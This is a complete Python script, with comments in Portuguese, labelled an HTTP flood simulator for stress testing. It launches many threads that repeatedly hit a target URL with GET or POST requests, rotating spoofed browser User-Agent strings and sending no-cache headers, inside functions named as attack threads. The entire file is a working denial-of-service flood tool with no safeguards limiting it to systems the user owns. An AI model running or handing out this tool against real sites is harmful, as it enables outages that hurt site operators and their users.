#!/usr/bin/env python3
import sys
import argparse
import threading
import time
import random
import urllib.request
import urllib.error
import socket
from urllib.parse import urlparse

# Configuração de cores
class Colors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_6 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.0 Mobile/15E148 Safari/604.1"
]

stats = {
    "requests": 0,
    "errors": 0,
    "success": 0
}
running = True

def attack_thread(url, method, payload, timeout):
    global stats, running

    parsed = urlparse(url)

    while running:
        try:
            req = urllib.request.Request(url)
            req.method = method
            req.add_header("User-Agent", random.choice(USER_AGENTS))
            req.add_header("Cache-Control", "no-cache")
            req.add_header("Accept-Encoding", "gzip, deflate")

            if payload and method == "POST":
                req.data = payload.encode('utf-8')
                req.add_header("Content-Type", "application/x-www-form-urlencoded")

            with urllib.request.urlopen(req, timeout=timeout) as response:
                stats["requests"] += 1
                if 200 <= response.status < 300:
                    stats["success"] += 1
                else:
                    stats["errors"] += 1

        except urllib.error.HTTPError as e:
            stats["requests"] += 1
            stats["errors"] += 1
        except urllib.error.URLError as e:
            stats["errors"] += 1
        except Exception as e:
            stats["errors"] += 1
            # Para evitar CPU 100% em loop de erro rápido
            time.sleep(0.01)

def monitor_thread():
    global stats, running
    start_time = time.time()
    while running:
        elapsed = time.time() - start_time
        if elapsed > 0:
            rps = stats["requests"] / elapsed
            print(f"\r{Colors.OKBLUE}[*] Requests: {stats['requests']} | Sucesso: {stats['success']} | Erros: {stats['errors']} | RPS: {rps:.2f}{Colors.ENDC}", end="")
        time.sleep(1)

def main():
    global running
    parser = argparse.ArgumentParser(description="Simulador de HTTP Flood (Stress Test)")
    parser.add_argument("url", help="URL alvo (ex: http://example.com)")
    parser.add_argument("--threads", type=int, default=10, help="Número de threads (default: 10)")
    parser.add_argument("--duration", type=int, default=60, help="Duração do teste em segundos (default: 60)")
    parser.add_argument("--method", type=str, choices=["GET", "POST"], default="GET", help="Método HTTP (default: GET)")
    parser.add_argument("--payload", type=str, default=None, help="Payload para POST (ex: 'key1=value1&key2=value2')")
    parser.add_argument("--timeout", type=int, default=5, help="Timeout da requisição em segundos")

    args = parser.parse_args()

    print(f"{Colors.HEADER}=== Iniciando HTTP Flood Simulator ==={Colors.ENDC}")
    print(f"Alvo: {args.url}")
    print(f"Threads: {args.threads}")
    print(f"Método: {args.method}")
    print(f"Duração: {args.duration}s")

    threads_list = []

    # Thread de monitoramento
    monitor = threading.Thread(target=monitor_thread)
    monitor.daemon = True
    monitor.start()

    # Iniciar threads de ataque
    for _ in range(args.threads):
        t = threading.Thread(target=attack_thread, args=(args.url, args.method, args.payload, args.timeout))
        t.daemon = True
        t.start()
        threads_list.append(t)

    try:
        time.sleep(args.duration)
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}Interrompido pelo usuário!{Colors.ENDC}")

    running = False
    print(f"\n{Colors.OKGREEN}Teste finalizado.{Colors.ENDC}")
    print(f"Total Requests: {stats['requests']}")
    print(f"Total Sucesso: {stats['success']}")
    print(f"Total Erros: {stats['errors']}")

if __name__ == "__main__":
    main()
